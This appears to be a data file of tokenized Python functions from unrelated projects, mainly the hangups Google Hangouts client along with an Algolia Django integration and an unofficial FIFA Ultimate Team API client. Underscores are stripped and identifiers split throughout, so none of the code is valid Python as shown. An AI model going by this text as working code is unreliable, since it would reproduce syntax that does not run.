def delete record ( self , instance ) : object ID = self . object ID ( instance ) try : self . index . delete object ( object ID ) logger . info ( 'DELETE %s FROM %s' , object ID , self . model ) except Algolia Exception as e : if DEBUG : raise e else : logger . warning ( '%s FROM %s NOT DELETED: %s' , object ID , self . model , e )
def raw search ( self , query = '' , params = None ) : if params is None : params = { } try : return self . index . search ( query , params ) except Algolia Exception as e : if DEBUG : raise e else : logger . warning ( 'ERROR DURING SEARCH ON %s: %s' , self . index name , e )
def get settings ( self ) : try : logger . info ( 'GET SETTINGS ON %s' , self . index name ) return self . index . get settings ( ) except Algolia Exception as e : if DEBUG : raise e else : logger . warning ( 'ERROR DURING GET SETTINGS ON %s: %s' , self . model , e )
def set settings ( self ) : if not self . settings : return try : self . index . set settings ( self . settings ) logger . info ( 'APPLY SETTINGS ON %s' , self . index name ) except Algolia Exception as e : if DEBUG : raise e else : logger . warning ( 'SETTINGS NOT APPLIED ON %s: %s' , self . model , e )
def handle ( self , * args , * * options ) : self . stdout . write ( 'Apply settings to index:' ) for model in get registered model ( ) : if options . get ( 'model' , None ) and not ( model . name in options [ 'model' ] ) : continue get adapter ( model ) . set settings ( ) self . stdout . write ( '\t* {}' . format ( model . name ) )
def get adapter ( self , model ) : if not self . is registered ( model ) : raise Registration Error ( '{} is not registered with Algolia engine' . format ( model ) ) return self . registered models [ model ]
def delete record ( self , instance ) : adapter = self . get adapter from instance ( instance ) adapter . delete record ( instance )
def raw search ( self , model , query = '' , params = None ) : if params is None : params = { } adapter = self . get adapter ( model ) return adapter . raw search ( query , params )
def post save receiver ( self , instance , * * kwargs ) : logger . debug ( 'RECEIVE post save FOR %s' , instance . class ) self . save record ( instance , * * kwargs )
def pre delete receiver ( self , instance , * * kwargs ) : logger . debug ( 'RECEIVE pre delete FOR %s' , instance . class ) self . delete record ( instance )
def handle ( self , * args , * * options ) : batch size = options . get ( 'batchsize' , None ) if not batch size : # py34-django18: batchsize is set to None if the user don't set # the value, instead of not be present in the dict batch size = 1000 self . stdout . write ( 'The following models were reindexed:' ) for model in get registered model ( ) : if options . get ( 'model' , None ) and not ( model . name in options [ 'model' ] ) : continue counts = reindex all ( model , batch size = batch size ) self . stdout . write ( '\t* {} --> {}' . format ( model . name , counts ) )
def handle ( self , * args , * * options ) : self . stdout . write ( 'Clear index:' ) for model in get registered model ( ) : if options . get ( 'model' , None ) and not ( model . name in options [ 'model' ] ) : continue clear index ( model ) self . stdout . write ( '\t* {}' . format ( model . name ) )
def pad cells ( table ) : col sizes = [ max ( map ( len , col ) ) for col in zip ( * table ) ] for row in table : for cell num , cell in enumerate ( row ) : row [ cell num ] = pad to ( cell , col sizes [ cell num ] ) return table
def add dividers ( row , divider , padding ) : div = '' . join ( [ padding * ' ' , divider , padding * ' ' ] ) return div . join ( row )
def club Staff ( self ) : method = 'GET' url = 'club/stats/staff' rc = self . request ( method , url ) return rc
def club Consumables ( self , fast = False ) : method = 'GET' url = 'club/consumables/development' rc = self . request ( method , url ) events = [ self . pin . event ( 'page view' , 'Hub - Club' ) ] self . pin . send ( events , fast = fast ) events = [ self . pin . event ( 'page view' , 'Club - Consumables' ) ] self . pin . send ( events , fast = fast ) events = [ self . pin . event ( 'page view' , 'Club - Consumables - List View' ) ] self . pin . send ( events , fast = fast ) return [ item Parse ( i ) for i in rc . get ( 'item Data' , ( ) ) ]
def tradepile ( self ) : method = 'GET' url = 'tradepile' rc = self . request ( method , url ) # pin Events events = [ self . pin . event ( 'page view' , 'Hub - Transfers' ) , self . pin . event ( 'page view' , 'Transfer List - List View' ) ] if rc . get ( 'auction Info' ) : events . append ( self . pin . event ( 'page view' , 'Item - Detail View' ) ) self . pin . send ( events ) return [ item Parse ( i ) for i in rc . get ( 'auction Info' , ( ) ) ]
def send To Sbs ( self , challenge id , item id ) : # TODO?: multiple item ids method = 'PUT' url = 'sbs/challenge/%s/squad' % challenge id squad = self . sbs Squad ( challenge id ) players = [ ] moved = False n = 0 for i in squad [ 'squad' ] [ 'players' ] : if i [ 'item Data' ] [ 'id' ] == item id : # item already in sbs  # TODO?: report reason return False if i [ 'item Data' ] [ 'id' ] == 0 and not moved : i [ 'item Data' ] [ 'id' ] = item id moved = True players . append ( { "index" : n , "item Data" : { "id" : i [ 'item Data' ] [ 'id' ] , "dream" : False } } ) n += 1 data = { 'players' : players } if not moved : return False else : self . request ( method , url , data = json . dumps ( data ) ) return True
def messages ( self ) : method = 'GET' url = 'active Message' rc = self . request ( method , url ) # try: #     return rc['active Message'] # except: #     raise Unknown Error('Invalid active Message response')  # is it even possible? return rc [ 'active Message' ]
def num2hex ( self , num ) : temp = '' for i in range ( 0 , 4 ) : x = self . hex Chars [ ( num >> ( i * 8 + 4 ) ) & 0x0F ] y = self . hex Chars [ ( num >> ( i * 8 ) ) & 0x0F ] temp += ( x + y ) return temp
def logger ( name = None , save = False ) : logger = logging . get Logger ( name ) if save : logformat = '%(asctime)s [%(levelname)s] [%(name)s] %(func Name)s: %(message)s (line %(lineno)d)' log file path = 'fut.log' # TODO: define logpath open ( log file path , 'w' ) . write ( '' ) # remove old logs logger . set Level ( logging . DEBUG ) logger handler = logging . File Handler ( log file path ) logger handler . set Formatter ( logging . Formatter ( logformat ) ) else : logger handler = Null Handler ( ) logger . add Handler ( logger handler ) return logger
def destroy image acquirer ( self , ia ) : id = None if ia . device : # ia . stop image acquisition ( ) # ia . release data streams ( ) # id = ia . device . id # if ia . device . node map : # if ia . chunk adapter : ia . chunk adapter . detach buffer ( ) ia . chunk adapter = None self . logger . info ( 'Detached a buffer from the chunk adapter of {0}.' . format ( id ) ) ia . device . node map . disconnect ( ) self . logger . info ( 'Disconnected the port from the Node Map of {0}.' . format ( id ) ) # if ia . device . is open ( ) : ia . device . close ( ) self . logger . info ( 'Closed Device module, {0}.' . format ( id ) ) ia . device = None # if id : self . logger . info ( 'Destroyed the Image Acquirer object which {0} ' 'had belonged to.' . format ( id ) ) else : self . logger . info ( 'Destroyed an Image Acquirer.' ) if self . profiler : self . profiler . print diff ( ) self . ias . remove ( ia )
def Watson ( T , Hvap ref , T Ref , Tc , exponent = 0.38 ) : Tr = T / Tc Trefr = T Ref / Tc H2 = Hvap ref * ( ( 1 - Tr ) / ( 1 - Trefr ) ) ** exponent return H2
async def on receive array ( self , array ) : if array [ 0 ] == 'noop' : pass # This is just a keep-alive, ignore it. else : wrapper = json . loads ( array [ 0 ] [ 'p' ] ) # Wrapper appears to be a Protocol Buffer message, but encoded via # field numbers as dictionary keys. Since we don't have a parser # for that, parse it ad-hoc here. if '3' in wrapper : # This is a new client id. self . client id = wrapper [ '3' ] [ '2' ] logger . info ( 'Received new client id: %r' , self . client id ) # Once client id is received, the channel is ready to have # services added. await self . add channel services ( ) if '2' in wrapper : pblite message = json . loads ( wrapper [ '2' ] [ '2' ] ) if pblite message [ 0 ] == 'cbu' : # This is a (Client)Batch Update containing State Update # messages. batch update = hangouts pb2 . Batch Update ( ) pblite . decode ( batch update , pblite message , ignore first item = True ) for state update in batch update . state update : logger . debug ( 'Received State Update:\n%s' , state update ) header = state update . state update header self . active client state = header . active client state await self . on state update . fire ( state update ) else : logger . info ( 'Ignoring message: %r' , pblite message [ 0 ] )
async def add user ( self , add user request ) : response = hangouts pb2 . Add User Response ( ) await self . pb request ( 'conversations/adduser' , add user request , response ) return response
async def create conversation ( self , create conversation request ) : response = hangouts pb2 . Create Conversation Response ( ) await self . pb request ( 'conversations/createconversation' , create conversation request , response ) return response
async def easter egg ( self , easter egg request ) : response = hangouts pb2 . Easter Egg Response ( ) await self . pb request ( 'conversations/easteregg' , easter egg request , response ) return response
async def get conversation ( self , get conversation request ) : response = hangouts pb2 . Get Conversation Response ( ) await self . pb request ( 'conversations/getconversation' , get conversation request , response ) return response
async def get group conversation url ( self , get group conversation url request ) : response = hangouts pb2 . Get Group Conversation Url Response ( ) await self . pb request ( 'conversations/getgroupconversationurl' , get group conversation url request , response ) return response
async def get self info ( self , get self info request ) : response = hangouts pb2 . Get Self Info Response ( ) await self . pb request ( 'contacts/getselfinfo' , get self info request , response ) return response
async def get suggested entities ( self , get suggested entities request ) : response = hangouts pb2 . Get Suggested Entities Response ( ) await self . pb request ( 'contacts/getsuggestedentities' , get suggested entities request , response ) return response
async def query presence ( self , query presence request ) : response = hangouts pb2 . Query Presence Response ( ) await self . pb request ( 'presence/querypresence' , query presence request , response ) return response
async def remove user ( self , remove user request ) : response = hangouts pb2 . Remove User Response ( ) await self . pb request ( 'conversations/removeuser' , remove user request , response ) return response
async def search entities ( self , search entities request ) : response = hangouts pb2 . Search Entities Response ( ) await self . pb request ( 'contacts/searchentities' , search entities request , response ) return response
async def send chat message ( self , send chat message request ) : response = hangouts pb2 . Send Chat Message Response ( ) await self . pb request ( 'conversations/sendchatmessage' , send chat message request , response ) return response
async def modify otr status ( self , modify otr status request ) : response = hangouts pb2 . Modify OTR Status Response ( ) await self . pb request ( 'conversations/modifyotrstatus' , modify otr status request , response ) return response
async def send offnetwork invitation ( self , send offnetwork invitation request ) : response = hangouts pb2 . Send Offnetwork Invitation Response ( ) await self . pb request ( 'devices/sendoffnetworkinvitation' , send offnetwork invitation request , response ) return response
async def set active client ( self , set active client request ) : response = hangouts pb2 . Set Active Client Response ( ) await self . pb request ( 'clients/setactiveclient' , set active client request , response ) return response
async def set conversation notification level ( self , set conversation notification level request ) : response = hangouts pb2 . Set Conversation Notification Level Response ( ) await self . pb request ( 'conversations/setconversationnotificationlevel' , set conversation notification level request , response ) return response
async def set focus ( self , set focus request ) : response = hangouts pb2 . Set Focus Response ( ) await self . pb request ( 'conversations/setfocus' , set focus request , response ) return response
async def set group link sharing enabled ( self , set group link sharing enabled request ) : response = hangouts pb2 . Set Group Link Sharing Enabled Response ( ) await self . pb request ( 'conversations/setgrouplinksharingenabled' , set group link sharing enabled request , response ) return response
async def set presence ( self , set presence request ) : response = hangouts pb2 . Set Presence Response ( ) await self . pb request ( 'presence/setpresence' , set presence request , response ) return response
async def set typing ( self , set typing request ) : response = hangouts pb2 . Set Typing Response ( ) await self . pb request ( 'conversations/settyping' , set typing request , response ) return response
async def sync all new events ( self , sync all new events request ) : response = hangouts pb2 . Sync All New Events Response ( ) await self . pb request ( 'conversations/syncallnewevents' , sync all new events request , response ) return response
async def sync recent conversations ( self , sync recent conversations request ) : response = hangouts pb2 . Sync Recent Conversations Response ( ) await self . pb request ( 'conversations/syncrecentconversations' , sync recent conversations request , response ) return response
def from timestamp ( microsecond timestamp ) : # Create datetime without losing precision from floating point (yes, this # is actually needed): return datetime . datetime . fromtimestamp ( microsecond timestamp // 1000000 , datetime . timezone . utc ) . replace ( microsecond = ( microsecond timestamp % 1000000 ) )
def from participantid ( participant id ) : return user . User ID ( chat id = participant id . chat id , gaia id = participant id . gaia id )
def to participantid ( user id ) : return hangouts pb2 . Participant Id ( chat id = user id . chat id , gaia id = user id . gaia id )
def parse watermark notification ( p ) : return Watermark Notification ( conv id = p . conversation id . id , user id = from participantid ( p . sender id ) , read timestamp = from timestamp ( p . latest read timestamp ) , )
def get authorization headers ( sapisid cookie ) : # It doesn't seem to matter what the url and time are as long as they are # consistent. time msec = int ( time . time ( ) * 1000 ) auth string = '{} {} {}' . format ( time msec , sapisid cookie , ORIGIN URL ) auth hash = hashlib . sha1 ( auth string . encode ( ) ) . hexdigest ( ) sapisidhash = 'SAPISIDHASH {} {}' . format ( time msec , auth hash ) return { 'authorization' : sapisidhash , 'x-origin' : ORIGIN URL , 'x-goog-authuser' : '0' , }
async def lookup entities ( client , args ) : lookup spec = get lookup spec ( args . entity identifier ) request = hangups . hangouts pb2 . Get Entity By Id Request ( request header = client . get request header ( ) , batch lookup spec = [ lookup spec ] , ) res = await client . get entity by id ( request ) # Print the list of entities in the response. for entity result in res . entity result : for entity in entity result . entity : print ( entity )
def get lookup spec ( identifier ) : if identifier . startswith ( '+' ) : return hangups . hangouts pb2 . Entity Lookup Spec ( phone = identifier , create offnetwork gaia = True ) elif '@' in identifier : return hangups . hangouts pb2 . Entity Lookup Spec ( email = identifier , create offnetwork gaia = True ) else : return hangups . hangouts pb2 . Entity Lookup Spec ( gaia id = identifier )
def add color to scheme ( scheme , name , foreground , background , palette colors ) : if foreground is None and background is None : return scheme new scheme = [ ] for item in scheme : if item [ 0 ] == name : if foreground is None : foreground = item [ 1 ] if background is None : background = item [ 2 ] if palette colors > 16 : new scheme . append ( ( name , '' , '' , '' , foreground , background ) ) else : new scheme . append ( ( name , foreground , background ) ) else : new scheme . append ( item ) return new scheme
def is quiet ( self ) : level = self . conversation . self conversation state . notification level return level == hangouts pb2 . NOTIFICATION LEVEL QUIET
def on watermark notification ( self , notif ) : # Update the conversation: if self . get user ( notif . user id ) . is self : logger . info ( 'latest read timestamp for {} updated to {}' . format ( self . id , notif . read timestamp ) ) self conversation state = ( self . conversation . self conversation state ) self conversation state . self read state . latest read timestamp = ( parsers . to timestamp ( notif . read timestamp ) ) # Update the participants' watermarks: previous timestamp = self . watermarks . get ( notif . user id , datetime . datetime . min . replace ( tzinfo = datetime . timezone . utc ) ) if notif . read timestamp > previous timestamp : logger . info ( ( 'latest read timestamp for conv {} participant {}' + ' updated to {}' ) . format ( self . id , notif . user id . chat id , notif . read timestamp ) ) self . watermarks [ notif . user id ] = notif . read timestamp
def wrap event ( event ) : cls = conversation event . Conversation Event if event . Has Field ( 'chat message' ) : cls = conversation event . Chat Message Event elif event . Has Field ( 'otr modification' ) : cls = conversation event . OTR Event elif event . Has Field ( 'conversation rename' ) : cls = conversation event . Rename Event elif event . Has Field ( 'membership change' ) : cls = conversation event . Membership Change Event elif event . Has Field ( 'hangout event' ) : cls = conversation event . Hangout Event elif event . Has Field ( 'group link sharing modification' ) : cls = conversation event . Group Link Sharing Modification Event return cls ( event )
def get event request header ( self ) : otr status = ( hangouts pb2 . OFF THE RECORD STATUS OFF THE RECORD if self . is off the record else hangouts pb2 . OFF THE RECORD STATUS ON THE RECORD ) return hangouts pb2 . Event Request Header ( conversation id = hangouts pb2 . Conversation Id ( id = self . id ) , client generated id = self . client . get client generated id ( ) , expected otr = otr status , delivery medium = self . get default delivery medium ( ) , )
def add conversation ( self , conversation , events = [ ] , event cont token = None ) : # pylint: disable=dangerous-default-value conv id = conversation . conversation id . id logger . debug ( 'Adding new conversation: {}' . format ( conv id ) ) conv = Conversation ( self . client , self . user list , conversation , events , event cont token ) self . conv dict [ conv id ] = conv return conv
async def sync ( self ) : logger . info ( 'Syncing events since {}' . format ( self . sync timestamp ) ) try : res = await self . client . sync all new events ( hangouts pb2 . Sync All New Events Request ( request header = self . client . get request header ( ) , last sync timestamp = parsers . to timestamp ( self . sync timestamp ) , max response size bytes = 1048576 , # 1 MB ) ) except exceptions . Network Error as e : logger . warning ( 'Failed to sync events, some events may be lost: {}' . format ( e ) ) else : for conv state in res . conversation state : conv id = conv state . conversation id . id conv = self . conv dict . get ( conv id , None ) if conv is not None : conv . update conversation ( conv state . conversation ) for event in conv state . event : timestamp = parsers . from timestamp ( event . timestamp ) if timestamp > self . sync timestamp : # This updates the sync timestamp for us, as well # as triggering events. await self . on event ( event ) else : self . add conversation ( conv state . conversation , conv state . event , conv state . event continuation token )
def add user from conv part ( self , conv part ) : user = User . from conv part data ( conv part , self . self user . id ) existing = self . user dict . get ( user . id ) if existing is None : logger . warning ( 'Adding fallback User with %s name "%s"' , user . name type . name . lower ( ) , user . full name ) self . user dict [ user . id ] = user return user else : existing . upgrade name ( user ) return existing
async def fire ( self , * args , * * kwargs ) : logger . debug ( 'Fired {}' . format ( self ) ) for observer in self . observers : gen = observer ( * args , * * kwargs ) if asyncio . iscoroutinefunction ( observer ) : await gen
def markdown ( tag ) : return ( MARKDOWN START . format ( tag = tag ) , MARKDOWN END . format ( tag = tag ) )
def html ( tag ) : return ( HTML START . format ( tag = tag ) , HTML END . format ( tag = tag ) )
def get parser ( extra args ) : parser = argparse . Argument Parser ( formatter class = argparse . Argument Defaults Help Formatter , ) dirs = appdirs . App Dirs ( 'hangups' , 'hangups' ) default token path = os . path . join ( dirs . user cache dir , 'refresh token.txt' ) parser . add argument ( '--token-path' , default = default token path , help = 'path used to store O Auth refresh token' ) parser . add argument ( '-d' , '--debug' , action = 'store true' , help = 'log detailed debugging messages' ) for extra arg in extra args : parser . add argument ( extra arg , required = True ) return parser
async def async main ( example coroutine , client , args ) : # Spawn a task for hangups to run in parallel with the example coroutine. task = asyncio . ensure future ( client . connect ( ) ) # Wait for hangups to either finish connecting or raise an exception. on connect = asyncio . Future ( ) client . on connect . add observer ( lambda : on connect . set result ( None ) ) done , = await asyncio . wait ( ( on connect , task ) , return when = asyncio . FIRST COMPLETED ) await asyncio . gather ( * done ) # Run the example coroutine. Afterwards, disconnect hangups gracefully and # yield the hangups task to handle any exceptions. try : await example coroutine ( client , args ) except asyncio . Cancelled Error : pass finally : await client . disconnect ( ) await task
def main ( ) : parser = argparse . Argument Parser ( ) parser . add argument ( 'protofilepath' ) args = parser . parse args ( ) out file = compile protofile ( args . protofilepath ) with open ( out file , 'rb' ) as proto file : # pylint: disable=no-member file descriptor set = descriptor pb2 . File Descriptor Set . From String ( proto file . read ( ) ) # pylint: enable=no-member for file descriptor in file descriptor set . file : # Build dict of location tuples locations = { } for location in file descriptor . source code info . location : locations [ tuple ( location . path ) ] = location # Add comment to top print ( make comment ( 'This file was automatically generated from {} and ' 'should not be edited directly.' . format ( args . protofilepath ) ) ) # Generate documentation for index , message desc in enumerate ( file descriptor . message type ) : generate message doc ( message desc , locations , ( 4 , index ) ) for index , enum desc in enumerate ( file descriptor . enum type ) : generate enum doc ( enum desc , locations , ( 5 , index ) )
def dir maker ( path ) : directory = os . path . dirname ( path ) if directory != '' and not os . path . isdir ( directory ) : try : os . makedirs ( directory ) except OS Error as e : sys . exit ( 'Failed to create directory: {}' . format ( e ) )
def main ( ) : # Build default paths for files. dirs = appdirs . App Dirs ( 'hangups' , 'hangups' ) default log path = os . path . join ( dirs . user log dir , 'hangups.log' ) default token path = os . path . join ( dirs . user cache dir , 'refresh token.txt' ) default config path = 'hangups.conf' user config path = os . path . join ( dirs . user config dir , 'hangups.conf' ) # Create a default empty config file if does not exist. dir maker ( user config path ) if not os . path . isfile ( user config path ) : with open ( user config path , 'a' ) as cfg : cfg . write ( "" ) parser = configargparse . Argument Parser ( prog = 'hangups' , default config files = [ default config path , user config path ] , formatter class = configargparse . Argument Defaults Help Formatter , add help = False , # Disable help so we can add it to the correct group. ) general group = parser . add argument group ( 'General' ) general group . add ( '-h' , '--help' , action = 'help' , help = 'show this help message and exit' ) general group . add ( '--token-path' , default = default token path , help = 'path used to store O Auth refresh token' ) general group . add ( '--date-format' , default = '< %y-%m-%d >' , help = 'date format string' ) general group . add ( '--time-format' , default = '(%I:%M:%S %p)' , help = 'time format string' ) general group . add ( '-c' , '--config' , help = 'configuration file path' , is config file = True , default = user config path ) general group . add ( '-v' , '--version' , action = 'version' , version = 'hangups {}' . format ( hangups . version ) ) general group . add ( '-d' , '--debug' , action = 'store true' , help = 'log detailed debugging messages' ) general group . add ( '--manual-login' , action = 'store true' , help = 'enable manual login method' ) general group . add ( '--log' , default = default log path , help = 'log file path' ) key group = parser . add argument group ( 'Keybindings' ) key group . add ( '--key-next-tab' , default = 'ctrl d' , help = 'keybinding for next tab' ) key group . add ( '--key-prev-tab' , default = 'ctrl u' , help = 'keybinding for previous tab' ) key group . add ( '--key-close-tab' , default = 'ctrl w' , help = 'keybinding for close tab' ) key group . add ( '--key-quit' , default = 'ctrl e' , help = 'keybinding for quitting' ) key group . add ( '--key-menu' , default = 'ctrl n' , help = 'keybinding for context menu' ) key group . add ( '--key-up' , default = 'k' , help = 'keybinding for alternate up key' ) key group . add ( '--key-down' , default = 'j' , help = 'keybinding for alternate down key' ) key group . add ( '--key-page-up' , default = 'ctrl b' , help = 'keybinding for alternate page up' ) key group . add ( '--key-page-down' , default = 'ctrl f' , help = 'keybinding for alternate page down' ) notification group = parser . add argument group ( 'Notifications' ) # deprecated in favor of --notification-type=none: notification group . add ( '-n' , '--disable-notifications' , action = 'store true' , help = configargparse . SUPPRESS ) notification group . add ( '-D' , '--discreet-notifications' , action = 'store true' , help = 'hide message details in notifications' ) notification group . add ( '--notification-type' , choices = sorted ( NOTIFIER TYPES . keys ( ) ) , default = 'default' , help = 'type of notifications to create' ) # add color scheme options col group = parser . add argument group ( 'Colors' ) col group . add ( '--col-scheme' , choices = COL SCHEMES . keys ( ) , default = 'default' , help = 'colour scheme to use' ) col group . add ( '--col-palette-colors' , choices = ( '16' , '88' , '256' ) , default = 16 , help = 'Amount of available colors' ) for name in COL SCHEME NAMES : col group . add ( '--col-' + name . replace ( ' ' , '-' ) + '-fg' , help = name + ' foreground color' ) col group . add ( '--col-' + name . replace ( ' ' , '-' ) + '-bg' , help = name + ' background color' ) args = parser . parse args ( ) # Create all necessary directories. for path in [ args . log , args . token path ] : dir maker ( path ) logging . basic Config ( filename = args . log , level = logging . DEBUG if args . debug else logging . WARNING , format = LOG FORMAT ) # urwid makes asyncio's debugging logs VERY noisy, so adjust the log level: logging . get Logger ( 'asyncio' ) . set Level ( logging . WARNING ) datetimefmt = { 'date' : args . date format , 'time' : args . time format } # setup color scheme palette colors = int ( args . col palette colors ) col scheme = COL SCHEMES [ args . col scheme ] for name in COL SCHEME NAMES : col scheme = add color to scheme ( col scheme , name , getattr ( args , 'col ' + name + ' fg' ) , getattr ( args , 'col ' + name + ' bg' ) , palette colors ) keybindings = { 'next tab' : args . key next tab , 'prev tab' : args . key prev tab , 'close tab' : args . key close tab , 'quit' : args . key quit , 'menu' : args . key menu , 'up' : args . key up , 'down' : args . key down , 'page up' : args . key page up , 'page down' : args . key page down , } notifier = get notifier ( args . notification type , args . disable notifications ) try : Chat UI ( args . token path , keybindings , col scheme , palette colors , datetimefmt , notifier , args . discreet notifications , args . manual login ) except Keyboard Interrupt : sys . exit ( 'Caught Keyboard Interrupt, exiting abnormally' )
def exception handler ( self , loop , context ) : # Start a graceful shutdown. self . coroutine queue . put ( self . client . disconnect ( ) ) # Store the exception to be re-raised later. If the context doesn't # contain an exception, create one containing the error message. default exception = Exception ( context . get ( 'message' ) ) self . exception = context . get ( 'exception' , default exception )
def input filter ( self , keys , ) : if keys == [ self . keys [ 'menu' ] ] : if self . urwid loop . widget == self . tabbed window : self . show menu ( ) else : self . hide menu ( ) elif keys == [ self . keys [ 'quit' ] ] : self . coroutine queue . put ( self . client . disconnect ( ) ) else : return keys
def show menu ( self ) : # If the current widget in the Tabbed Window Widget has a menu, # overlay it on the Tabbed Window Widget. current widget = self . tabbed window . get current widget ( ) if hasattr ( current widget , 'get menu widget' ) : menu widget = current widget . get menu widget ( self . hide menu ) overlay = urwid . Overlay ( menu widget , self . tabbed window , align = 'center' , width = ( 'relative' , 80 ) , valign = 'middle' , height = ( 'relative' , 80 ) ) self . urwid loop . widget = overlay
def get conv widget ( self , conv id ) : if conv id not in self . conv widgets : set title cb = ( lambda widget , title : self . tabbed window . set tab ( widget , title = title ) ) widget = Conversation Widget ( self . client , self . coroutine queue , self . conv list . get ( conv id ) , set title cb , self . keys , self . datetimefmt ) self . conv widgets [ conv id ] = widget return self . conv widgets [ conv id ]
def add conversation tab ( self , conv id , switch = False ) : conv widget = self . get conv widget ( conv id ) self . tabbed window . set tab ( conv widget , switch = switch , title = conv widget . title )
async def on connect ( self ) : self . user list , self . conv list = ( await hangups . build user conversation list ( self . client ) ) self . conv list . on event . add observer ( self . on event ) # show the conversation menu conv picker = Conversation Picker Widget ( self . conv list , self . on select conversation , self . keys ) self . tabbed window = Tabbed Window Widget ( self . keys ) self . tabbed window . set tab ( conv picker , switch = True , title = 'Conversations' ) self . urwid loop . widget = self . tabbed window
def on event ( self , conv event ) : conv = self . conv list . get ( conv event . conversation id ) user = conv . get user ( conv event . user id ) show notification = all ( ( isinstance ( conv event , hangups . Chat Message Event ) , not user . is self , not conv . is quiet , ) ) if show notification : self . add conversation tab ( conv event . conversation id ) if self . discreet notifications : notification = DISCREET NOTIFICATION else : notification = notifier . Notification ( user . full name , get conv name ( conv ) , conv event . text ) self . notifier . send ( notification )
def put ( self , coro ) : # Avoid logging when a coroutine is queued or executed to avoid log # spam from coroutines that are started on every keypress. assert asyncio . iscoroutine ( coro ) self . queue . put nowait ( coro )
async def consume ( self ) : while True : coro = await self . queue . get ( ) assert asyncio . iscoroutine ( coro ) await coro
def rename ( self , name , callback ) : self . coroutine queue . put ( self . conversation . rename ( name ) ) callback ( )
def on event ( self , ) : # TODO: handle adding new conversations self . sort ( key = lambda conv button : conv button . last modified , reverse = True )
def show message ( self , message str ) : if self . message handle is not None : self . message handle . cancel ( ) self . message handle = asyncio . get event loop ( ) . call later ( self . MESSAGE DELAY SECS , self . clear message ) self . message = message str self . update ( )
def on event ( self , conv event ) : if isinstance ( conv event , hangups . Chat Message Event ) : self . typing statuses [ conv event . user id ] = ( hangups . TYPING TYPE STOPPED ) self . update ( )
def on typing ( self , typing message ) : self . typing statuses [ typing message . user id ] = typing message . status self . update ( )
def update ( self ) : typing users = [ self . conversation . get user ( user id ) for user id , status in self . typing statuses . items ( ) if status == hangups . TYPING TYPE STARTED ] displayed names = [ user . first name for user in typing users if not user . is self ] if displayed names : typing message = '{} {} typing...' . format ( ', ' . join ( sorted ( displayed names ) ) , 'is' if len ( displayed names ) == 1 else 'are' ) else : typing message = '' if not self . is connected : self . widget . set text ( "RECONNECTING..." ) elif self . message is not None : self . widget . set text ( self . message ) else : self . widget . set text ( typing message )
def get date str ( timestamp , datetimefmt , show date = False ) : fmt = '' if show date : fmt += '\n' + datetimefmt . get ( 'date' , '' ) + '\n' fmt += datetimefmt . get ( 'time' , '' ) return timestamp . astimezone ( tz = None ) . strftime ( fmt )
async def load ( self ) : try : conv events = await self . conversation . get events ( self . conversation . events [ 0 ] . id ) except ( Index Error , hangups . Network Error ) : conv events = [ ] if not conv events : self . first loaded = True if self . focus position == self . POSITION LOADING and conv events : # If the loading indicator is still focused, and we loaded more # events, set focus on the first new event so the loaded # indicator is replaced. self . set focus ( conv events [ - 1 ] . id ) else : # Otherwise, still need to invalidate in case the loading # indicator is showing but not focused. self . modified ( ) # Loading events can also update the watermarks. self . refresh watermarked events ( ) self . is loading = False
def set focus ( self , position ) : self . focus position = position self . modified ( ) # If we set focus to anywhere but the last position, the user if # scrolling up: try : self . next position ( position ) except Index Error : self . is scrolling = False else : self . is scrolling = True
def get menu widget ( self , close callback ) : return Conversation Menu ( self . coroutine queue , self . conversation , close callback , self . keys )
def keypress ( self , size , key ) : # Set the client as active. self . coroutine queue . put ( self . client . set active ( ) ) # Mark the newest event as read. self . coroutine queue . put ( self . conversation . update read timestamp ( ) ) return super ( ) . keypress ( size , key )
def set title ( self ) : self . title = get conv name ( self . conversation , show unread = True , truncate = True ) self . set title cb ( self , self . title )
def on return ( self , text ) : # Ignore if the user hasn't typed a message. if not text : return elif text . startswith ( '/image' ) and len ( text . split ( ' ' ) ) == 2 : # Temporary UI for testing image uploads filename = text . split ( ' ' ) [ 1 ] image file = open ( filename , 'rb' ) text = '' else : image file = None text = replace emoticons ( text ) segments = hangups . Chat Message Segment . from str ( text ) self . coroutine queue . put ( self . handle send message ( self . conversation . send message ( segments , image file = image file ) ) )
def update tabs ( self ) : text = [ ] for num , widget in enumerate ( self . widgets ) : palette = ( 'active tab' if num == self . tab index else 'inactive tab' ) text += [ ( palette , ' {} ' . format ( self . widget title [ widget ] ) ) , ( 'tab background' , ' ' ) , ] self . tabs . set text ( text ) self . frame . contents [ 'body' ] = ( self . widgets [ self . tab index ] , None )
def keypress ( self , size , key ) : key = super ( ) . keypress ( size , key ) num tabs = len ( self . widgets ) if key == self . keys [ 'prev tab' ] : self . tab index = ( self . tab index - 1 ) % num tabs self . update tabs ( ) elif key == self . keys [ 'next tab' ] : self . tab index = ( self . tab index + 1 ) % num tabs self . update tabs ( ) elif key == self . keys [ 'close tab' ] : # Don't allow closing the Conversations tab if self . tab index > 0 : curr tab = self . widgets [ self . tab index ] self . widgets . remove ( curr tab ) del self . widget title [ curr tab ] self . tab index -= 1 self . update tabs ( ) else : return key
async def on push data ( self , data bytes ) : logger . debug ( 'Received chunk:\n{}' . format ( data bytes ) ) for chunk in self . chunk parser . get chunks ( data bytes ) : # Consider the channel connected once the first chunk is received. if not self . is connected : if self . on connect called : self . is connected = True await self . on reconnect . fire ( ) else : self . on connect called = True self . is connected = True await self . on connect . fire ( ) # chunk contains a container array container array = json . loads ( chunk ) # container array is an array of inner arrays for inner array in container array : # inner array always contains 2 elements, the array id and the # data array. array id , data array = inner array logger . debug ( 'Chunk contains data array with id %r:\n%r' , array id , data array ) await self . on receive array . fire ( data array )
def decode field ( message , field , value ) : if field . type == Field Descriptor . TYPE MESSAGE : decode ( getattr ( message , field . name ) , value ) else : try : if field . type == Field Descriptor . TYPE BYTES : value = base64 . b64decode ( value ) setattr ( message , field . name , value ) except ( Value Error , Type Error ) as e : # Value Error: invalid enum value, negative unsigned int value, or # invalid base64 # Type Error: mismatched type logger . warning ( 'Message %r ignoring field %s: %s' , message . class . name , field . name , e )
def decode repeated field ( message , field , value list ) : if field . type == Field Descriptor . TYPE MESSAGE : for value in value list : decode ( getattr ( message , field . name ) . add ( ) , value ) else : try : for value in value list : if field . type == Field Descriptor . TYPE BYTES : value = base64 . b64decode ( value ) getattr ( message , field . name ) . append ( value ) except ( Value Error , Type Error ) as e : # Value Error: invalid enum value, negative unsigned int value, or # invalid base64 # Type Error: mismatched type logger . warning ( 'Message %r ignoring repeated field %s: %s' , message . class . name , field . name , e ) # Ignore any values already decoded by clearing list message . Clear Field ( field . name )
